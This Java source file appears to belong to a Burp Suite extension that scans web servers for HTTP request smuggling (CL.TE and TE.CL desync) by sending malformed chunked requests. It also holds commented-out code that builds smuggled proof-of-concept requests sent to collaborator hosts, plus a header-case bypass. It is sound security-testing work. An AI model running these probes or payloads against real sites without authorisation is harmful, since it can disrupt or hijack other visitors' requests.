package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.zip.GZIPOutputStream;

public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {

    ChunkContentScan(String name) {
        super(name);
    }

    public boolean doConfiguredScan(byte[] original, IHttpService service, HashMap<String, Boolean> config) {
        if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") && BurpExtender.hostsToSkip.containsKey(service.getHost())) {
            return false;
        }

        original = setupRequest(original);

        original = Utilities.addOrReplaceHeader(original, "User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36");
        original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "foo");
        original = Utilities.setHeader(original, "Connection", "close");

        byte[] baseReq = makeChunked(original, 0, 0, config, true);
        Resp syncedResp = request(service, baseReq);
        if (!syncedResp.failed() && !(Utilities.globalSettings.getBoolean("only report exploitable") && syncedResp.getStatus() == 400)) {


            byte[] reverseLength = makeChunked(original, -6, 0, config, true);

            Resp truncatedChunk = request(service, reverseLength, 3);
            if (truncatedChunk.timedOut()) {

                if (request(service, baseReq).timedOut()) {
                    return false;
                }

                if (truncatedChunk.getReq().getResponse() != null) {
                    Utilities.out("Unexpected report with response");
                }

                String title = "HTTP Request Smuggling: CL.TE " + String.join("|", config.keySet());

                if (leftAlive(baseReq, service) ) {
                    title += " left-alive";
                } else {
                    title += " closed";
                }

                if (truncatedChunk.getReq().getResponse() != null) {
                    title += " (delayed response)";
                }

                report(title,
                        "Burp issued a request, and got a response. Burp then issued the same request, but with a shorter Content-Length, and got a timeout.<br/> " +
                                "This suggests that the front-end system is using the Content-Length header, and the backend is using the Transfer-Encoding: chunked header. You should be able to manually verify this using the Repeater, provided you uncheck the 'Update Content-Length' setting on the top menu. <br/>" +
                                "As such, it may be vulnerable to HTTP Desync attacks, aka Request Smuggling. <br/>" +
                                "To attempt an actual Desync attack, right click on the attached request and choose 'Desync attack'. Please note that this is not risk-free - other genuine visitors to the site may be affected.<br/><br/>Please refer to <a href=\"https://portswigger.net/blog/http-desync-attacks\">https://portswigger.net/blog/http-desync-attacks</a> for further information. ",
                        syncedResp, truncatedChunk);
                return true;
            }
        }

        baseReq = makeChunked(original, 0, 0, config, false);
        syncedResp = request(service, baseReq);
        if (syncedResp.failed() || (Utilities.globalSettings.getBoolean("only report exploitable") && syncedResp.getStatus() == 400)) {
            Utilities.log("Timeout on first request. Aborting.");
            return false;
        }

        // this is unsafe for CL-TE, so we only attempt it if CL-TE detection failed
        byte[] reverseLength = makeChunked(original, 1, 0, config, false); //Utilities.setHeader(baseReq, "Content-Length", "4");
        ByteArrayOutputStream reverseLengthBuilder = new ByteArrayOutputStream();
        try {
            reverseLengthBuilder.write(reverseLength);
            reverseLengthBuilder.write('X');
            reverseLength = reverseLengthBuilder.toByteArray();
        } catch (IOException e) {

        }
        Resp truncatedChunk = request(service, reverseLength, 3);

        if (truncatedChunk.timedOut()) {

            if (request(service, baseReq).timedOut()) {
                return false;
            }

            String title = "HTTP Request Smuggling: TE.CL " + String.join("|", config.keySet());

            if (leftAlive(baseReq, service) ) {
                title += " left-alive";
            } else {
                title += " closed";
            }

            if (truncatedChunk.getReq().getResponse() != null) {
                title += " (delayed response)";
            }

            report(title,
                    "Burp issued a request, and got a response. Burp then issued the same request, but with a closing chunk in the body, and got a timeout. <br/>" +
                            "This suggests that the front-end system is using the Transfer-Encoding header, and the backend is using the Content-Length header. You should be able to manually verify this using the Repeater. <br/>" +
                            "As such, it may be vulnerable to HTTP Desync attacks, aka Request Smuggling. <br/>" +
                            "To attempt an actual Desync attack, right click on the attached request and choose 'Desync attack'. Please note that this is not risk-free - other genuine visitors to the site may be affected. <br/><br/>Please refer to <a href=\"https://portswigger.net/blog/http-desync-attacks\">https://portswigger.net/blog/http-desync-attacks</a> for further information. ",
                    syncedResp, truncatedChunk);
            return true;
        }

        return false;
    }

//    boolean sendPoc(byte[] base, IHttpService service, HashMap<String, Boolean> config) {
//
//        HashSet<Boolean> results = new LinkedHashSet<>();
//        if (Utilities.globalSettings.getBoolean("poc: G")) {
//            results.add(prepPoc(base, service, "G", "G", config));
//        }
//        //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
//        //boolean cpoc = sendPoc(base, service, "collab", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
//
//        String collabWithHost = service.getHost() + ".xgh671sw1qfujgcs17uxlyxn4ea4yt.psres.net";
//
//        if (Utilities.globalSettings.getBoolean("poc: headerConcat")) {
//            results.add(prepPoc(base, service, "headerConcat",
//                      "GET /?x=ma0y2848iz35nt9im7yeziwqxh37rw/"+service.getHost()+" HTTP/1.1\r\n" +
//                            "Host: 52.16.21.24\r\n" +
//                            "Foo: x", config));
//        }
//        if (Utilities.globalSettings.getBoolean("poc: bodyConcat")) {
//            results.add(prepPoc(base, service, "bodyConcat",
//                      "POST /?x=ma0y2848iz35nt9im7yeziwqxh37rw/"+service.getHost()+" HTTP/1.1\r\n" +
//                            "Host: 52.16.21.24\r\n" +
//                            "Content-Type: application/x-www-form-urlencoded\r\n" +
//                            "Content-Length: 8\r\n\r\n" +
//                            "foo=", config));
//        }
//        if (Utilities.globalSettings.getBoolean("poc: collab")) {
//            results.add(prepPoc(base, service, "collab",
//                      "GET / HTTP/1.1\r\n" +
//                            "Host: "+collabWithHost+"\r\n\r\n", config));
//        }
//        if (Utilities.globalSettings.getBoolean("poc: collab-header")) {
//            results.add(prepPoc(base, service, "collab-header",
//                      "GET / HTTP/1.1\r\n" +
//                            "Host: "+collabWithHost+"\r\n" +
//                            "X-Foo: X", config));
//        }
//        if (Utilities.globalSettings.getBoolean("poc: collab-XFO-header")) {
//            results.add(prepPoc(base, service, "collab-xfo-header",
//                    "GET / HTTP/1.1\r\n" +
//                    "X-Forwarded-Host: "+collabWithHost+"\r\n" +
//                    "X-Foo: X", config));
//        }
//        if (Utilities.globalSettings.getBoolean("poc: collab-abs")) {
//            results.add(prepPoc(base, service, "collab-abs",
//                      "GET http://"+collabWithHost+"/ HTTP/1.1\r\n" +
//                            "X-Foo: X", config));
//        }
//        if (Utilities.globalSettings.getBoolean("poc: collab-at")) {
//            results.add(prepPoc(base, service,
//                      "collab-at",
//                      "GET @"+collabWithHost+"/ HTTP/1.1\r\n" +
//                            "X-Foo: X", config));
//        }
//        if (Utilities.globalSettings.getBoolean("poc: collab-blind")) {
//            String req = String.format(
//                    "GET / HTTP/1.1\r\n" +
//                    "Host: %s\r\n" +
//                    "Referer: http://ref.%s/\r\n" +
//                    "X-Forwarded-For: xff.%s\r\n" +
//                    "True-Client-IP: tci.%s\r\n" +
//                    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\r\n" +
//                    "Accept-Encoding: gzip, deflate\r\n" +
//                    "Accept: */*\r\n" +
//                    "Accept-Language: en\r\n" +
//                    "connection: close\r\n\r\n", service.getHost(), collabWithHost, collabWithHost, collabWithHost);
//            // 'Connection: close' gets changed to keep-alive which breaks the offset
//            results.add(prepPoc(base, service, "collab-blind", req, config));
//        }
//        return results.contains(Boolean.TRUE);
//    }
//
//    class DualChunkCL {
//        String getAttack(byte[] base, String inject, HashMap<String, Boolean> config) {
//            byte[] prep = Utilities.setHeader(base, "Connection", "keep-alive");
//            prep = bypassContentLengthFix(makeChunked(prep, inject.length(), 0, config, false));
//            return Utilities.helpers.bytesToString(prep)+inject;
//        }
//    }
//
//    class DualChunkTE {
//        String getAttack(byte[] base, String inject, HashMap<String, Boolean> config) {
//            try {
//                byte[] initial = Utilities.setHeader(base, "Connection", "keep-alive");
//                ByteArrayOutputStream attackStream = new ByteArrayOutputStream();
//                attackStream.write(initial);
//                attackStream.write(inject.getBytes());
//
//                byte[] attack = makeChunked(attackStream.toByteArray(), 0, 0, config, false);
//                String attackString = Utilities.helpers.bytesToString(attack);
//                int CL = attackString.lastIndexOf(inject) - Utilities.getBodyStart(attack);
//                attack = Utilities.setHeader(attack, "Content-Length", String.valueOf(CL));
//
//                attack = bypassContentLengthFix(attack);
//                Utils.out(Utilities.helpers.bytesToString(attack));
//                return Utilities.helpers.bytesToString(attack);
//            } catch (IOException e) {
//                return null;
//            }
//        }
//    }

//    boolean prepPoc(byte[] base, IHttpService service, String name, String inject, HashMap<String, Boolean> config) {
//        String setupAttack = new DualChunkCL().getAttack(base, inject, config);
//        //setupAttack = new DualChunkTE().getAttack(base, inject, config);
//        byte[] victim = makeChunked(base, 0, 0, config, false);
//        return sendPoc(name, setupAttack, victim, service, new HashMap<>());
//    }
//
//
//
//    byte[] bypassContentLengthFix(byte[] req) {
//        return Utilities.replace(req, "Content-Length: ".getBytes(), "Content-length: ".getBytes());
//    }

}

